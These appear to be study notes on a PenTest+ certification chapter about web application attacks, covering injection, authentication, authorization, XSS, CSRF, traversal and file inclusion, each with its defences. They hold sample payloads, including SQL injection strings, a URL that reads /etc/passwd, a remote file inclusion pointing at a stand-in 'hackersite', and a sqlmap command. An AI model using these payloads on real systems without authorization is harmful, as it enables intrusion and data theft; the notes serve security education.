# CompTIA® PenTest+® Certification For Dummies®, 2nd Edition

# Chapter 7: Exploiting ApplicationBased Vulnerabilities

Common Application Based Attacks used to exploit company's applications and systems/data that reside behind those applications.

Also look at common Vuln found within applications, how to identify unsecure coding practices to avoid them.

#

## Looking at Common Application-Based Attacks

### Injection Attacks

- Common types of attacks against applications. Web app are vuln because their audience extended out to internet.
- Injection attack involves hacker accessing application that typically prompts for info; login information or search criteria for product.
- When application prompt for login info, hacker inserts or injects code into the application where the app expects user input.
- Problem: Developers of app may only expect regular "words" to be inserted. Input needs to be validated: testing whether it is safe input that is expected.
- Types: SQL, HTML, command, code injection attacks.

### SQL Injection Attack

- SQL = Structured Query Language; standard database language used to search or retrieve, insert, delete, modify data from database.
- To understand SQLi should understand code developer programmed into Logon button:
  - ` Select * from users where logonname = '$username' and password = '$password'` `
 
![image](https://github.com/user-attachments/assets/0a6a5fbc-c87e-4914-b682-14b34e7e16a0)

Goal
- Goal: To answer, “Is there a user that matches this username and password in our system?”
- SQLi attack just need to create a true condition.
  - Write password to test in password box, but close off the single quote (') to close the single quote that appears in the code of the button.
  - Add condition that is true `1=1`.
  - Add two dashes (--) to comment out any SQL code that the developer would execute when the Logon button is pressed. 
    - Microsoft SQL Servers uses (--); MySQL uses (#) for comment symbol.

' or 1=1 
- ` mypass' or 1=1 -- `: generate true condition.
  - Changing the query from: “Let them in if the username and password is correct", into: “Let them in if the username and password is correct or if 1=1.”
- Validating the input is important: should not accept ' or -- or # in password box; should check data for symbols and not send query to database if they exist.

Semicolon
- Semicolon (;) is needed because it allows you to run multiple commands on single line. Critical for hacker as you typing all of this into the password box.
- Developer should ensure semicolon is not the inpu before data is sent to database server.

### Type of SQLi Attacks

Blind SQL: 
- Attacker submits SQL queries into application that return info about the structure of the database in order to learn more about the target database.

Boolean SQL: 
- SQL query is submitted into application and result that is returned is either true or false.

Stacked Queries: 
  - Attacker uses a UNION statement to join multiple queries together in one command.
  - Result: a single listing made up of results from multiple tables.

![image](https://github.com/user-attachments/assets/a8807e91-a24c-4b8b-bc8f-91cc0bddff1a)

### Protecting Against SQLi Attacks

Sanitization
- SQLi attacks are successful from application allowing data input from user to contain characters that are used to control SQL statements
  - Semicolon `;`, Double dashes `--`
- Sanitization occurs when characters are removed by programmer when the data is submitted into application before input is sent to backend database for processing.

Validation
- Critical for developers to validate the input to ensure it is within scope of expected values.
- Example: if input is supposed to contain number representing quantity of items being purchased; system should check (validate) only number is allow on the input.

Parameterized Queries
- Critical countermeasure to protect against SQLi attack is to use parameterized queries.
- Parameterized query = SQL query that is set up to expect parameter (values) of particular data type that are defined at the beginning of query.
- When query is called, input is passed into parameters where input is `verified` before passing input into SQL startement of query.

#

### HTML Injection Attack

HTML Injection Attack
- Similar concept to SQLi attack
- But HTML code is inserted into application instead of SQL code.
- Typically as part of Cross Site Scripting (XSS) attack.

Goal of HTML injection Attack
- Insert HTML code into form that would get stored in database for app connected.
- If application dev did not validate or sanitize input, its possible for HTML code to be added to Database.
  - Meaning: when someone views the page later, data is read from database, browser will read and execute the new HTML that change the appearance of the page.
  - Hacker could insert HTML code to create a login form for stealing visitor's user and password.

 
### Command Injection Attack

Command Injection Attack
- Hacker insert calls to commands as input in hopes that they can execute commands within the underlining OS.

Example:
- Perl Web Application read contents of file: `http://target_site/cgi-bin/showData.pl?doc=user1.txt`
- If it's vulnerable to command injection, hackers could alter reference to document to reference an executable:
  - `http://target_site/cgi-bin/showData.pl?doc=/bin/ls|`
- PHP environment, can attempt to make call to OS command by appending a semicolon to the end of the URL then referencing OS cammand.
  - `%3B` = `;`, `%20` = space: for URL encoding.
  - Making a call to `cat` command trying to display passwd file: `http://target_site/showData.php?dir=%3Bcat%20/etc/passwd`
 
Key:
- Command injection is that URL contains reference to OS command.
- Not SQL code: select, insert, update or delete command.


### Code Injection Attack

Code Injection Attack
- Hacker inserts application code into application of the language was written in.

Example:
- Web Application: hackers could insert JavaScript into web app causing the app to execute in a way not expected.
- PHP Application: hackers would try to inject PHP code that is used to discover information about the environment.
  - PHP site that is vuln to code injection would show info about PHP setup: `http://target_site/showData.php?id=1;phpinfo()`
  - Call to a function with `()` brackets at the end = good indication of code injection.
  - Calling to OS command will not have brackets.
 

### LDAP Injection and XML Injection Attacks

LDAP Injection Attack
- Lightweight Directory Access Protocol (LDAP) = a common protocol used to access directory services containing listings of users and other object within a company.
- Attacker inserts LDAP commands into an application that makes an LDAP call to directory service.
- Commands could be used to retrieve info from directory or make unauthorized modification.

XML Injection
- XML data is inserted into application to obtain undesired result.
- Example: if applciation is not validating input, hacker could inject XML data so data is altered or even new data is created in the application.

#

## Authentication Attacks

Methods used to try to bypass authentication or compromise security of application by cracking the application's passwords.

### Credential Brute-forcing

Credential Bruteforcing
- Technique used to compromise app security
- Crack the passwords for user accounts of the app.
- Tools: John the Ripper, Hashcat.


### Session Attacks and Session Hijacking

Session Attack
- HTTP uses session token (cookie) that is created when client connects to website.
- Token is used by web server to know who is sending the request.
- Attacker can take over the session and impersonate you by performing a session attack.
  - Obtain the session token and start sending requests to the server with that token.
 
Session Hijacking
- A way hackers can gain access to web app without needing to crack passwords.
- When user logs onto website, session token is sent to that user's browser as a flag that user has been logged in.
- Hackers can obtain that token or cookie info, use that info to access application without needing to authenticate because app thinks already authenticated.
- Hacker can obtain the cookie or token info from client by exploiting client's system or eavesdropping communication if not encrypted.


### Redirect

Redirect
- Occurs when request is sent to a server, a page that needs to be filled in by user.
- URL also contains a redirect parameter that is used to automatically send user to another page following the submission of the form.

Example: `http://site/purchase.aspx?redirect=confirmation.aspx`
- If dev of app does not validate target of the redirect, it is possible that the hacker can change this redirect
- Have the user redirected to a site that prompts user to login.
- redirect: `http://site/purchase.aspx?redirect=www.hackersite.com`


### Default Credentials

Default Credential Attack
- Occurs when hacker uses device's or system's default credentials to gain access.
- Hoping admin has not change them.
- Common with devices like routers and switches that have default credentials config by manufacturer.
- As an admin, first thing should change the default credentials.


### Weak Credentials

Weak Credentials 
- Hacker can assess passwords of system with tools; Hydra, John the Ripper.
- Tools can also perform dictionary attack with wordlist file
- Cracking tools tries each word in the file.
- Be sure to config complex password for all accounts including upper and lowercase, number and symbols, at less 8 character long.


### Kerberos Exploits

Kerberos
- Authentication protocol built into Windows networks that uses a `Ticket Granting Services` (TGS).
- When client logs on network, client receives `Ticket Granting Ticket` (TGT) from Kerberos Key Distribution Center (KDC).
- TGT = Authentication ticket, only given after KDC verifies the credentials of user logging in.
  - Client must get a session key from TGS if they wants to access a service on network. 
  - To get session key from TGS, client sents TGT it received after logon to TGS as verification.
  - TGT is verified and client has permission to access the service, session key is sent to client.
 
Exploits
- Brute-Forcing: To identify user accounts, crack passwords, and gain access to TGT for users by using tools such as Python Script `Kerbrute.py` or `Rebeus` for Windows.
  - Both tools uses user list file and password list file to identify whether user account exists and password is cracked.
- Silver Tickets: A forged TGS ticket (session key) used to gain access to service.
  - If hacker present TGS ticket to service, there is no need for service to check with kerberos service, as it thinks hacker is authorized due to having TGS ticket.
 

#

## Authorization Attacks

Two common Technieuqes that can be used to bypass Authorization features and compromise system = Parameter Pollution and Insecure Direct Object Reference

### Parameter Pollution

Parameter Pollution
- Also known: HTTP Parameter Pollution
- A way to try to confuse application and bypass the input validation in web application by supplying same parameter value multiple times in the HTTP request.

Example: 
- Viewing list of products, URL normally look like:
  - `http://site/logon.aspx?uname=bob&pass=1234`
- We are logging into app with username and password, with parameter pollution, trying to supply same parameter a second time and inject malicious content:
  - `http://site/logon.aspx?uname=bob&pass=1234&pass=1234' or 1=1 --`

Goal: 
- Input validation may only occur on the first occurrence of the parameter
- Might be able to slip in SQLi attack to bypass the security.
- Even if parameter pollution does not work, it can provide application erroe that is user for discovering more about environment the app is running in.
  - The platform the app is running on or database environment being utilized to hold app data.
 

### Insecure Direct Object Reference

Insecure Direct Object Reference (IDOR)
- Vulnerability where dev of application does not implement authorization features to verify that someone accessing data on site is allowed to access that data.


Example: 
- Client that has a web app that its customers login to make purchases.
- Client stores purchase history and payment details in tables in database.
- When customer view their purchase history; URL: 
  - `http://site/purchasehistory.php?cid=109`
 
- Insecure Direct Object access is vuln that allow you to change customer ID in URL to view sensitive information of another customer (object):
  - `http://site/purchasehistory.php?cid=110`
 
Overview
- Being able to view purchase info for another customer is huge security issue within the app.
- This is a common vulnerability in many web app.

#

## XSS and CSRF/XSRF Attacks

Two common vuln in web app is Cross-Site Scripting and Cross-Site Request Forgery.

### Cross-site Scripting (XSS)

Cross-site Scripting
- XSS is one of the most common vuln found in web app.
- Involves hacker injecting client-side script into web page that is the nviewed and executed by others at a later time.

Different Type of XSS
- Stored/Persistent
- Reflected
- DOM

Stored/Persistent XSS Attack
- Hacker fill out a form on webpage and includes HTML Script tag with some malicious JavaScript.
- Hacker knows the info in the form is then saved to database when submitted.
- When Someone views the data on website at a later time, record is retrieved and client browser read the script tag and executes the JavaScript.

Reflected XSS Attack
- Known as Non-Persistent: because form data submitted is not stored in database
- Its submitted to web server for processing
- Form submitted data is immediately processed by the web server and Used to display content on the webpage for user.
- Risk is similar to persistent XSS attacks, if hacker embeds JavaScript within the form data, server will then display that data on the page.
- Entering in `<script>alert("hello");</script>` and it works, then app is vuln to XSS attack.


![image](https://github.com/user-attachments/assets/5510aba4-c858-46e2-b2df-181da759816d)


DOM
- Both Persistent and Refected XSS attacks involved web server processing the form data.
- DOM-Based XSS = XSS that can be performed at the client side.
  - Form data submitted and processed on the client.


HTTP request message for XSS Attack:
- `http://site/processnumber.asp?txtCreditCard=%3Cscript%3Ealert%28%22hello%22%29%3B%3C%2Fscript%3E`

- txtCreditCard Parameter has `script` in it and `alert` call.
- the word `script` appears at the end as well.

![image](https://github.com/user-attachments/assets/c6f03f46-7427-4ae7-8f82-a6bb7b5ee68a)

### Final Note on XSS

To protect from all XSS attacks, you should ensure that you perform validation and sanitization when form data is submitted.
- Similart to protecting against HTML injection, Code Injection, SQLi, or Command injection attacks.

#

## Cross-Site Request Forgery (CSRF/XSRF)

Goal:
- To get an unsuspecting user to submit data to website the user has already logged onto.
- Leverages fact that the site has already authenticated user to the site, therefore trusts all actions from the user.

Example: 
- Normal for user to call the `setpassword` command by clicking the link within the site the user has already logged onto.
- With CSRF, hacker just has to trick user into clicking a link that calls `setpassword1 command where the hacker can change the password on the user's account without the user's knowledge.
- Link could be on another site the hacker tricks user into visiting or link could be sent by email.
- Once user clicks the link and password is changed, hacker is able to logon to the site using that account.

Another Example:
- After user has logged into a banking site, hacker tricks the user into clicking a link that calls transfer funds command in oder to transfer fund out of their account.

Possible:
- These attacks are possible because most site store info in cookies, including authentication cookies.
  - Cookie: setting that stored in memory on the client's machine or in a text file.
- When user sends HTTP request to site, all cookie values stored on client for that site are automatically sent with the web request.
  - Includes authentication cookies and any session info stored in cookies.
- When website receives the request, it reads cookie info that user is logged in.
- Site then processes request
- But the site doesn't know hacker tricked user into sending the request.

CSRF/XSRF in Action:
1. User logs on social media site, stays logged on while working so they can check messages from time to time.
2. User receives email message from hacker that has a link embedded in email that calls `SetPassword()` function of the social media site.
3. User clicks link without knowing that link calls the `setpassword` function of the user social media account. User's cookie info, which contains user's account info, is sent with request to social media site.
4. `SetPassword()` fucntion is called without the user's knowledge and hacker has now changed the user's password.

![image](https://github.com/user-attachments/assets/a21fe81e-64d4-42cd-920f-0e8c83ace73d)

CSRF/XSRF URL 
- Example: `http://targetsite/?action=setpassword&v=hackerpass`
- Note: Calls an action called `setpassword` and passes the value of hackerpass to action.
- Note: no specific account is referenced because target site will use whatever account is already authenticated.

Preventing CSRF/XSRF
- Website dev must make sure the request for commands come from their own website, not external site or email.
- Done by putting a secret value, known: synchronization token, into every request coming from its own site.
- For example: every time a request comes into social media site for `SetPassword()` function, social media site would make sure request has its secret token as proof the request came from its own site.
- Hacker would not know this secret value, so hacker's request would not be successful.
- Note: Synchronization token would be created by change password webpage on the real site.

![image](https://github.com/user-attachments/assets/af445b71-f4dd-45ed-b1ec-3b490ed68ef2)

#

## Server-Side Request Forgery (SSRF)

Server-Side Request Forgery
- Occures when attacker exploits a web app and causes it to make a request to another web server.
- On the internal network but target web server could be different external system as well.
- Attack is userful for byapssing firewall that is blocking attacker from accessing internal systems.
- Attacker manipulates an external facing website to make request to an internal site for them.

#

# Understanding Application Security Vulnerabilities

Three most common application security Vulnerabilities: 
- Clickjacking
- Security Misconfiguration
- File inclusion

### Clickjacking

Clickjacking
- Occurs when hacker tricks user into clicking a hyperlink that runs malicious code that could modify security settings of system.
- User is typically tricked into clicking the link by the link being an ad on site for product or service user may want.
- Malicious code that executes modifies the security setting of the system, so hacker can gain access to that system.

### Security Misconfiguration

Security Misconfiguration
- Occurs when system either comes with no security configuration applied by default or system admin configures syatem in a way that causes system to be insecure.
  - Two common vuln on misconfigured system: Directory Traversal and Cookie Manipulation.
 
#### Directory Traversal

Directory Traversal
- Common mistake network admin makes when installing networking application: file servers and web servers
  - They accept the default config setting during installation.
- Hackers know the default config of the product they hack into; so change the default setting makes it harder to exploit.

Example: 
- Folder traversal attack against web servers.
- With default config, hacker know default folder for website; also know defalt folder into underlining OS is instealled.
  - Enabling hacker to access those folders.
- Microsoft IIS web server, default folder: `c:\inetpub` is set ip for default website.
  - Admin can put HTML doc for website into that folder so the content is published out to intranet or internet.
- Hackers know this, and they also know Windows OS is installed in `c:\windows` by default. 

![image](https://github.com/user-attachments/assets/60efff99-5127-48f1-923f-b38c7ea88edf)


Works:
- Folder traversing works cuz hackers know that when they browse to the website, they are looking at webpage in the `inetpub` directory.
- Hackers know that if they go back one folder, they should be at the root of the C: drive
- They can move forward into the Windows Directory to access an OS command

Example: `http://website/../../windows/system32/cmd.exe`
- add `/..` to navigate from webpage up to folder holding the webpage (inetpub folder)
- add `/..` to go to root of C drive.
- add `/windows` to navigate into Windows folder
- add `/system32/cmd.exe` so they could reference the command prompt of the system.
- This doesn't work on Windows web servers since IIS 5.


#### Cookie Manipulation

Cookies
- Common element used in web app to store info on user's system.
- Can automatically sent to website when user visit website.

How Cookies are Used:
- Web dev will store preferences in cookie such as product category, a person looked at.
  - So next time the user visits the site, the cookie is sent to web server and the dev can show promotion for product in that category.
- Cookie also used as a form of authentication token to indicate to web server that user has logged in.
  - Authentication cookies works by after user logs onto the site, cookie for that session is sent to user.
  - After that, with every request sent to the web server, broswer sends the cookie as well to indicte user has been authenicated.
  - On server side, web server checks every request ensuring cookie is present before processing the request.
    - If cookie doesn't exist, means user has not authenticated and will sent to the logon page.
   
Exploit:
- Hackers can perform MiTM attack, they can intercept request to web server, manipulate that request, then send it on to the web server.
- Tool; Burp Suite, Fiddler, mitmproxy can be used to capture and manipulate request including cookie.
- If hacker can eavesdrop on traffic and steal cookie, they can potentially use that to bypass system's authentication.


### File Inclusion

File Inclusion
- Build on Directory Traversal Attacks
- Don't just navigate thru system and look at file but execute a program from URL of the request message.

Types of file inclusion
- Local
- Remote

Local File Inclusion
- Used to execute program that is local and located on web server.
- hacker would typically compromise the system first and plant program on the system.
- To execute program at a later time, hacker would include a reference to program in URL:
  - `http://website/index.php?include=c:\\data\\exploit.exe`
 
Remote File Inclusion
- A program on another system.
- Benefit of this type is hacker does not have to exploit system first.
- Hacker simple references program on hacker's own web server:
  - `http://website/index.php?include=http://hackersite/exploit.exe`

Both cases, request is sent to website and essentially sayin "run this code yourself".


### Privilege Escalation

Privilege Escalation
- Occurs when attacker is able to elevate their right from basic user to admin capabilities.
- After system or application is exploited, privilege escalation is typically the next step.

Type of Privilege Escalation
- Horizontal Privilege Escalation
- Vertical Privilege Escalation

Horizontal Privilege Escalation
- Occurs when attacker change their privilege access to another account of same level.
- They may change from account with user-based access to another account with user-level access.
- Attacker doesn't gain admin level but may have access to other resources on a system.

Vertical Privilege Escalation
- Occurs when attacker obtains privileges of a higher level account.
- Attacker gains access to a system with user level access then exploit further to gain access to admin account.


### Session Replay and Session Fixation

Session Replay Attack
- Occurs when attacker captures traffic from client to server (visitor to a website).
- Modifies some of the info, then replays that traffic at a later time.

Example:
- Attacker may capture traffic to an unsecure ecommerce site of user making a purchase.
- After capturing data, attack modify the delivery address then resubmit the traffic causing another purchase to occur.


Session Fixation Attack
- Occurs when attacker obtains or sets a victim's session ID, then use the session ID to send a request to website and impersonate the victim or access victim's account.

#

## Common Coding Mistakes

Avoid the following unsecure coding mistakes

Business Logic Flaws
- General term for mistakes made in design and implementation of app.
- Cause vuln within app, resulting attacker to compromise app.

### Comment in Source Code

Comments in Source Code
- Do not include comment that contain sensitive security info that could aid hacker in compromising security of program or environment the program is in.
- If hacker gain access to script source code, hacker will have access to comments.
- Not as much of a problem with complied code platforms because when code is complied, compilation process removes comments from complied versin of code.


### Lack of Error Handling

Lack of Error Handling
- Many times errors that occur provide details on the innerworkings of app.
- Devs should be sure to add proper error handling to app and provide generic error message.
- No detailed info that hacker can use.


### Overly Verbose Error Handling

Overly Verbose Error Handling
- Some environments allow you to configure verbose (or detailed) error messages if you are sending request from the web server.
  - But no detail if request comming from remote system.
- Displaying detailed error information only if request came from webserver (not another system on the network) and getting verbose message that can aid you in understanding the problem.


### Hard-Coded Credentials

Hard-Coded Credentials
- Coding usernames and passwords into app so that the app always accesses resources such as files or databases with those credentials.
- This tech was often used with websites that accessed database.
- Using database admin account and password in their connection strings to connect to database is bad coding practice.
- SQLi attacks that go thru the site would execute in context of database admin account
  - Meaning hackers could manipulate database anyway they want.
 

### Race Conditions

Race Conditions
- Regards to application development
- Occurs when 2 different threads are able to access app logic at the same time.
- Logic is being executed after being called by the first thread, second thread calls the same logic before the first thread completes,
  - This cause data being accessed to be in a non-consistent state.
 
Example: 
- Start with $50, adding $200 but $100 2x before the first thread is finished.

![image](https://github.com/user-attachments/assets/ee201603-27b5-4d11-ae6b-a89a9650cf1c)

Solution:
- We want to ensure when Thread 1 calls deposit logic, no other thread can access logic until the data is saved with thread 1.
- Be in a wait state until the first thread is finished.
- Creating a `synchronized method`.

![image](https://github.com/user-attachments/assets/9c57721e-5639-4e85-9bf9-1f82c4d948b3)
 

### Unauthorized use of functions/Unprotected APIs

APIs = Applcation Platform Interfaces
- Allows other dev to call code from their own custome app.
- Vendors that creates API should ensure the calls to the API are over an encrypted channel; HTTPS
  - should ensure that user is authorized to make call to the function.
 
API technologies to be aware of:
- RESTful
- Exetensible Markup Language Remote Procedure Call (XML-RPC)
- Simple Object Access Protocol (SOAP)

RESTful APIs
- Calls to app logic located on another system over HTTP/HTTPS.
- Vuln to injetion att, important to validate input and use parameter vaidation.
- Limit the size of request message to API to that of typical size request message.

Extensible Markup Language-Remote Procedure Call (XML-RPC)
- RPC call encapsulated inside an HTTP message that uses XML as format of mesage.
- Tech to use before RESTful API
- Risk: enabled on your app; possible for attacker to make calls to functions on your website.
- Common Vuln found in WordPress sites.

Simple Object Access Protocol (SOAP)
- Messaging protocol that had replaced RPC calls in HTTP message before RESTful API.
- Format of data in SOAP message was XML.


### Hidden Element/Sensitive Information in the DOM

Hidden Element/Sensitive Information in the DOM
- Hidden Element does not appear on the webpage
- But its HTML element, it can be accessed thru code using Document Object Model (DOM).
- Problem: HTML elements are still visible when visitor views HTML source code.
- Do not hide sensitive info in hidden elements.


### Insecure Data Transmission

Insecure Data Transmission
- Transmit sensitive data in an unsecure format.
- All data should be transmitted in encrypted format, not plain text.
- Using Packet Sniffer; Wireshark can determine if app is transmitting data in plain text.


### Lack of Code Signing

Lack of Code Signing
- Code Siging = important feature of code security that should be leveraged as much as possible.
- Dev can obtain code signing certificate from certificate authority and digitally sign your code.

Benefit:
- Code Authorization
- Code Integrity

Code Authorization
- The software publisher is identified by the digital signature on the code.

Code Integrity
- Digitally signing the code, a hash value of the code is created.
- Anytime code is executed, you have the system look at the code and hash value to determine if code has changed.
- If code has changed, it will not run because it could be a malicious modification to the code.

#

## Secure Coding Best Practices

List of Secure Coding Best Practices to prevent Application based attacks

### Validation

Validation
- When data is sent to program by user, dev should perform checks on that data first
- If app asked user for quantity of item, developer should ensure the quantity entered is a number not a word (string).
- If date then check that data supplied is a valid date (12/35 doesn't exist)
- Make sure that string is only an expected number of characters.


### Sanitization

Sanitization
- Involves modifying characters that have been inputted to more appropriate or safer, characters before storing data in database.
- User may input phone number of 902-555-5555, but when you store it in the database, you may not want to store brackets and dash.
- So you remove those elements before storing data. Stored data: 9025555555.


### Escaping

Escaping
- Something we do when displaying data to the end user so that info is not used in evil way.
- Credit card example with XSS, we could escape any data input before writing it to HTML so that the script tag would actually print as text and not be interpreted as a script tag.


### Parameterized Queries

Parameterized Queries
- Help prevent SQLi attack, first step = Validate input
- Database side of thing, use parameterized queries or stored procedures.
  - An object on the database that has the database commands encapsulated inside of them.
 
Example: 
- May be a stored procedure called `sp_logonuser` that accepts username parameter and password parameter.
- web dev should call this stored procedure when writing the logic on logon because the database dev will take care of the select statement within store procedure.
- Because parameter are used, injection att will not be successful.

Benefit
- Can contain validation logic
- Prevent SQLi
- Performance benefits as the execution plan is cached on server.

#

## Common Tools and Resources

### Common Tools

Web Proxy
- Tool that can be used to intecept calls to web app, alter data, then send request onto target website.
- Can be used to submit request to web app and then analyze response.

Common Web Proxy
- OWASP Zed Attack Proxy (ZAP): Common security scanner that is used to identify vuln in web app.
- Burp Suite Community Edition: Can be used to intercept traffic to a website and analyze that traffic, but can also scan target and report potential vuln with target.

SQLmap
- Program you can use to automate SQLi attack against web app you are authorized to test in your PenTest.
- Need to pass in URL to be tested: `sqlmap -u http://192.168.1.3/product.php?id=5`
- Request to the page accept parameters as input, SQLmap will try a number of malicious input on the ID parameter.

DirBurster
- OWASP designed to locate directory and filenames on a web server.

### Common Resources

OWASP Top 10: 
- Lists out top ten security risks to web app, gives example on how these attacks can be performed.

Wordlists:
- Number of tools can be used to perform password attacks against systems or applications.
- Useful to have wordlist file that contains large number of words that can be attempted as password during password attack.

#

## Reviewing Key Concepts

» Injection attacks involve the pentester inputting HTML, code, a call to a command, or SQL syntax into an application to exploit a system or application. 

» Developers should implement validation, sanitization, and escaping techniques to create a more secure application. 

» Ensure that authentication and authorization features are incorporated into the application. Make sure passwords are complex and you are not using default passwords on devices. 

» Parameter pollution refers to inputting the same parameter twice to try to bypass validation procedures, while insecure direct object reference occurs when you change the parameter value to a different number to try to look at different data.

» Persistent XSS is when the HTML script code is written to a database and processed by another visitor to the site when the visitor views the page with the data. Reflected XSS does not store the HTML script in a database; rather, the server processes it right away, and when displayed back to the user, the script executes. 
» Remember that directory traversal is when the hacker modifies the URL and tries to navigate through the directory structure of the server to access a file or program. 

» Be sure developers incorporate error handling routines in the application code, but do not display overly verbose error handling messages. 

» Digitally sign your code when possible.

#

## For the Exam

- Be able to look at URL and understand what type of attack is being performed.
- SQLi attack; URL would have database code containing `;` and `--` : `http://site/product.php?id=5;update%20products%20set%20price=.50`
  - %20 = URL encoding for a space.
- Know different types of SQLi attacks that can be used during PenTesting.
- Be sure to know how to identify different types of Injection attacks by URL.
- Object Reference attack occurs when attacker modifies the item being referenced in URL; for example: `?id=5` changed to `?id=9`
- Be able to identify the types of app attacks by looking at HTTP request message and knowing whether it is XSS or parameter pollution attack.
- Be able to know the different types of XSS attacks and be able to know XSS as a form of attack when analyzing URL of HTTP request.
- Remeber CSRF/XSRF attack occurs when user clicks a link that calls an action on site without user's knowledge.
  - Link can be from hacker's site or email message
  - To prevent CSRF/XSRF attack, you should use synchronization token in your app to validate request came from your own app.
- Remember Directory Traversal Attacks (Folder Traversal Attack) occur when hacker navigates file system of web server in HTTP request.
  - Pattern `/../..` or `%2F..%2F..`.
 
